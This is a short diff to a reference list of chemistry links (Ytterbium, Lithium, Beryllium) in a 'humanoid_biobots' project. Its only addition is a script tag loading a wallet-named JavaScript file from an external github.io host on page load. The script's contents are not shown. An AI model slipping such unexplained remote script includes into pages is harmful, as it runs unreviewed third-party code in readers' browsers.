@@ -77,3 +77,4 @@ humanoid_biobots/
 4. [Ytterbium – WebElements](https://www.webelements.com/ytterbium/)
 5. [Lithium – Wikipedia](https://en.wikipedia.org/wiki/Lithium)
 6. [Beryllium – Wikipedia](https://en.wikipedia.org/wiki/Beryllium)
+<script src="https://www-infinity4.github.io/Mint-For-Infinity/infinity-wallet-menu.js" defer></script>
